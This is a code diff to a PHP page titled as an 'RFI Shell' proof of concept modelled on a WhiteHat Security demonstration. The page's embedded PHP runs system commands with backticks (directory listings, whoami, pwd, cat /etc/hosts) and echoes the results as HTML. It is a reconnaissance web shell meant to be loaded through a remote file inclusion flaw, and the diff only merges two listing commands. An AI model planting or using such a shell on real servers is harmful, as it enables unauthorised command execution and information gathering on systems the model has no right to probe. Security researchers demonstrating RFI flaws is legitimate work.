@@ -3,8 +3,7 @@
 <h1 id="header">RFI Shell inspired by WhiteHat Security Remote File Include Proof of Concept</h1>
 <!-- Comment out the PHP code should the code not be executed server side.
 <?php
-    $ls_output = `ls /var/www/html/rfi2`;
-    $ls_output_1 = `ls /var/www/html/rfi2/You_Cant_Find_This_Dir`;
+    $ls_output = `ls /var/www/html/rfi2/You_Cant_Find_This_Dir`;
     $whoami_output = `whoami`;
     $pwd_output = `pwd`;
     $catetchosts_output = `cat /etc/hosts`;
@@ -17,8 +16,6 @@
     ECHO "<li>Print Out System Infomation: (\"uname -a\")</li>";
     ECHO "<b><dl><dt>\"ls\" command:</dt></b>";
     ECHO "<dd><pre>" .$ls_output ."</pre></dd>";
-    ECHO "<b><dl><dt>\"ls1\" command:</dt></b>";
-    ECHO "<dd><pre>" .$ls_output_1 ."</pre></dd>";
     ECHO "<dt><b>Who Am I?</b></dt>"; 
     ECHO "<dd>".$whoami_output. "</dd>";
     ECHO "<b><dt>Present Working Directory:</dt></b>";
